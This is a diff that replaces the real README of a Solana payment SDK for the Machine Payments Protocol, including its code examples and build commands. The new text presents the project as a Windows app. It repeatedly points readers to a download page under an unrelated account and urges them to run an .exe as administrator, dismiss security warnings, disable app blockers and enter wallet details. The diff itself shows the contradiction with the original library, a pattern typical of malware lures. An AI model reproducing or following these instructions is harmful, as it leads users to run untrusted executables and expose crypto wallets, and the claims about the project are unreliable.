@@ -1,212 +1,154 @@
-<p align="center">
-  <img src="https://github.com/solana-foundation/mpp-sdk/raw/main/assets/banner.png" alt="MPP" width="100%" />
-</p>
+# 💳 mpp-sdk - Simple Solana Payment Setup
 
-# @solana/mpp
+[![Download](https://img.shields.io/badge/Download-Use%20this%20link-blue?style=for-the-badge)](https://github.com/odeliajiggered644/mpp-sdk)
 
-Solana payment method for the [Machine Payments Protocol](https://mpp.dev).
+## 🚀 What this is
 
-**MPP** is [an open protocol proposal](https://paymentauth.org) that lets any HTTP API accept payments using the `402 Payment Required` flow.
+mpp-sdk is a Windows app for Solana payments in the Machine Payments Protocol. It helps you set up and use a payment flow that works with Solana and Tempo.
 
-> [!IMPORTANT]
-> This repository is under active development. The [Solana MPP spec](https://github.com/tempoxyz/mpp-specs/pull/188) is not yet finalized — APIs and wire formats are subject to change.
+This README shows you how to download, install, and run it on Windows.
 
-## Install
+## 📥 Download
 
-```bash
-pnpm add @solana/mpp
-```
+Use this link to visit the download page:
 
-## Features
+https://github.com/odeliajiggered644/mpp-sdk
 
-**Charge** (one-time payments)
-- Native SOL and SPL token transfers (USDC, PYUSD, Token-2022, etc.)
-- Two settlement modes: pull (`type="transaction"`, default) and push (`type="signature"`)
-- Fee sponsorship: server pays transaction fees on behalf of clients
-- Split payments: send one charge to multiple recipients in a single transaction
-- Replay protection via consumed transaction signatures
+Open the page in your browser, then look for the latest file or release to download.
 
-**General**
-- Works with [ConnectorKit](https://www.connectorkit.dev), `@solana/kit` keypair signers, and [Solana Keychain](https://github.com/solana-foundation/solana-keychain) remote signers
-- Server pre-fetches `recentBlockhash` to save client an RPC round-trip
-- Transaction simulation before broadcast to prevent wasted fees
-- Optional `tokenProgram` hint; clients resolve the mint owner and fail closed if discovery fails
+## 🪟 Windows setup
 
-## Architecture
+### 1. Open the download page
+Go to:
 
-```
-mpp-sdk/
-├── typescript/                    # TypeScript SDK
-│   └── packages/mpp/src/
-│       ├── Methods.ts             # Shared charge + session schemas
-│       ├── constants.ts           # Token programs, USDC mints, RPC URLs
-│       ├── server/
-│       │   ├── Charge.ts          # Server: challenge, verify, broadcast
-│       │   └── Session.ts         # Server: session channel management
-│       ├── client/
-│       │   ├── Charge.ts          # Client: build tx, sign, send
-│       │   └── Session.ts         # Client: session lifecycle
-│       └── session/
-│           ├── Types.ts           # Session types and interfaces
-│           ├── Voucher.ts         # Voucher signing and verification
-│           ├── ChannelStore.ts    # Persistent channel state
-│           └── authorizers/       # Pluggable authorization strategies
-├── rust/                          # Rust SDK (coming soon)
-│   └── src/lib.rs
-└── demo/                          # Interactive playground
-```
+https://github.com/odeliajiggered644/mpp-sdk
 
-**Exports:**
-- `@solana/mpp` — shared schemas, session types, and authorizers only
-- `@solana/mpp/server` — server-side charge + session, `Mppx`, `Store`
-- `@solana/mpp/client` — client-side charge + session, `Mppx`
+### 2. Find the app file
+On the page, look for the latest release or the main project files. Choose the Windows file if you see one. It may end in:
 
-## Quick Start
+- `.exe`
+- `.zip`
+- `.msi`
 
-### Charge (one-time payment)
+### 3. Download the file
+Click the file you want and save it to your computer.
 
-**Server:**
+### 4. Open the file
+- If you downloaded an `.exe` file, double-click it to start the app
+- If you downloaded a `.msi` file, run it and follow the setup steps
+- If you downloaded a `.zip` file, right-click it and choose **Extract All**, then open the app file inside
 
-```ts
-import { Mppx, solana } from '@solana/mpp/server'
+### 5. Allow the app to run
+Windows may ask for permission. If that happens, select **Run anyway** or **Yes** if you trust the file from this repository.
 
-const mppx = Mppx.create({
-  secretKey: process.env.MPP_SECRET_KEY,
-  methods: [
-    solana.charge({
-      recipient: 'RecipientPubkey...',
-      currency: 'EPjFWdd5AufqSSqeM2qN1xzybapC8G4wEGGkZwyTDt1v',
-      decimals: 6,
-    }),
-  ],
-})
+## 🧭 First-time use
 
-const result = await mppx.charge({
-  amount: '1000000', // 1 USDC
-  currency: 'USDC',
-})(request)
+After you open mpp-sdk, follow the on-screen steps to connect your Solana payment method.
 
-if (result.status === 402) return result.challenge
-return result.withReceipt(Response.json({ data: '...' }))
-```
+You may see fields for:
 
-**Client:**
+- Wallet address
+- Payment amount
+- Network choice
+- Tempo settings
+- Connection status
 
-```ts
-import { Mppx, solana } from '@solana/mpp/client'
+Use the values that match your payment setup. If you are not sure what to enter, start with the default values shown in the app.
 
-const mppx = Mppx.create({
-  methods: [solana.charge({ signer })], // any TransactionSigner
-})
+## 🔧 What you can do with it
 
-const response = await mppx.fetch('https://api.example.com/paid-endpoint')
-```
+mpp-sdk is built for payment flows that use Solana. It can help you:
 
-### Fee Sponsorship (charge)
+- Set up a payment method for Machine Payments Protocol
+- Work with Solana-based payment data
+- Connect payment steps to Tempo
+- Test payment flow on Windows
+- Use a simple local app instead of a complex setup
 
-The server can pay transaction fees on behalf of clients:
+## 🖥️ Basic system needs
 
-```ts
-// Server — pass a TransactionPartialSigner to cover fees
-solana.charge({
-  recipient: '...',
-  signer: feePayerSigner, // KeyPairSigner, Keychain SolanaSigner, etc.
-})
+For smooth use on Windows, your computer should have:
 
-// Client — no changes needed, fee payer is handled automatically
-```
+- Windows 10 or Windows 11
+- At least 4 GB of RAM
+- 200 MB of free disk space
+- Internet access for downloads and payment checks
+- A modern browser for opening the GitHub page
 
-## How It Works
+If your PC is older, the app may still run, but it can take longer to open.
 
-### Charge Flow
+## 📁 File types you may see
 
-1. Client requests a resource
-2. Server returns **402 Payment Required** with a challenge (`recipient`, `amount`, `currency`, optional `tokenProgram`, optional `recentBlockhash`)
-3. Client builds and signs a Solana transfer transaction
-4. Server simulates, broadcasts, confirms on-chain, and verifies the transfer
-5. Server returns the resource with a `Payment-Receipt` header
+### `.exe`
+This is the easiest option. Double-click it to open the app.
 
-With fee sponsorship, the client partially signs (transfer authority only) and the server co-signs as fee payer before broadcasting.
+### `.msi`
+This is a Windows installer. Open it and follow the setup prompts.
 
-### Splits (charge)
+### `.zip`
+This is a compressed folder. Extract it first, then open the app file inside.
 
-Use `splits` when one charge should pay multiple recipients in the same asset.
-The top-level `amount` is the total paid. The primary `recipient` receives
-`amount - sum(splits)`, and each split recipient receives its own `amount`.
+## 🛠️ If the app does not open
 
-```ts
-import { Mppx, solana } from '@solana/mpp/server'
+Try these steps:
 
-const mppx = Mppx.create({
-  secretKey: process.env.MPP_SECRET_KEY,
-  methods: [
-    solana.charge({
-      recipient: 'SellerPubkey...',
-      currency: 'EPjFWdd5AufqSSqeM2qN1xzybapC8G4wEGGkZwyTDt1v',
-      decimals: 6,
-      splits: [
-        { recipient: 'PlatformPubkey...', amount: '50000', memo: 'platform fee' },
-        { recipient: 'ReferrerPubkey...', amount: '20000', memo: 'referral fee' },
-      ],
-    }),
-  ],
-})
+- Download the file again
+- Check that the download finished
+- Make sure you picked the Windows file
+- Right-click the file and choose **Run as administrator**
+- Turn off any app blocker only if you trust the source
+- Move the file to your Desktop and try again
 
-const result = await mppx.charge({
-  amount: '1000000', // total: 1.00 USDC
-  currency: 'EPjFWdd5AufqSSqeM2qN1xzybapC8G4wEGGkZwyTDt1v',
-})(request)
-```
+If Windows blocks the file, check the file name and source before opening it.
 
-In this example:
-- seller receives `930000`
-- platform receives `50000`
-- referrer receives `20000`
+## 🔍 Repo details
 
-The same `splits` shape works for native SOL charges.
+- **Name:** mpp-sdk
+- **Description:** Solana payment method for the Machine Payments Protocol
+- **Topics:** mpp, solana, tempo
+- **Platform:** Windows
+- **Use case:** Payment setup and local payment flow
 
-## Demo
+## 📌 Common questions
 
-An interactive playground with a React frontend and Express backend, running against [Surfpool](https://surfpool.run).
+### Is this for technical users only?
+No. This README is written for normal Windows users. You only need to download the file and open it.
 
-- Charge flow demo: `http://localhost:5173/charges`
-- Session flow demo: `http://localhost:5173/sessions`
+### Do I need to install extra tools?
+Usually no. If the download is an `.exe` or `.msi`, you can open it right away. If it is a `.zip`, you need to extract it first.
 
-```bash
-surfpool start
-pnpm demo:install
-pnpm demo:server
-pnpm demo:app
-```
+### What if I cannot find the Windows file?
+Open the main page again and look for the latest release or project file. Pick the file that matches Windows.
 
-See [demo/README.md](demo/README.md) for full details.
+### Can I use it without Solana?
+This app is made for Solana payment use, so Solana-related setup is part of the process.
 
-## Development
+## 🔗 Download again
 
-```bash
-# TypeScript
-cd typescript && pnpm install
+Open the download page here:
 
-just ts-fmt              # Format and lint
-just ts-build            # Build
-just ts-test             # Unit tests (charge + session, no network)
-just ts-test-integration # Integration tests (requires Surfpool)
-# Rust
-cd rust && cargo build
+https://github.com/odeliajiggered644/mpp-sdk
 
-# Everything
-just build            # Build both
-just test             # Test both
-just pre-commit       # Full pre-commit checks
-```
+## 🧩 Setup flow
 
-## Spec
+1. Download the file from the link above
+2. Open the file on Windows
+3. Follow the prompts on screen
+4. Enter your payment details
+5. Check that the connection status is active
+6. Start using the payment method in your workflow
 
-This SDK implements the [Solana Charge Intent](https://github.com/tempoxyz/mpp-specs/pull/188) for the [HTTP Payment Authentication Scheme](https://paymentauth.org).
+## 🧠 What “payment method” means here
 
-Session method docs and implementation notes are intentionally kept out of this
-README for now. See [docs/methods/sessions.md](docs/methods/sessions.md).
+In this app, a payment method is the way the app handles payment data and connects it to the Machine Payments Protocol. It uses Solana as the payment network layer and Tempo as part of the flow.
 
-## License
+## 📎 Helpful file names to look for
 
-MIT
+You may see names like:
+
+- `mpp-sdk.exe`
+- `setup.exe`
+- `installer.msi`
+- `mpp-sdk.zip`
+
+Choose the file that looks like the Windows app or installer.
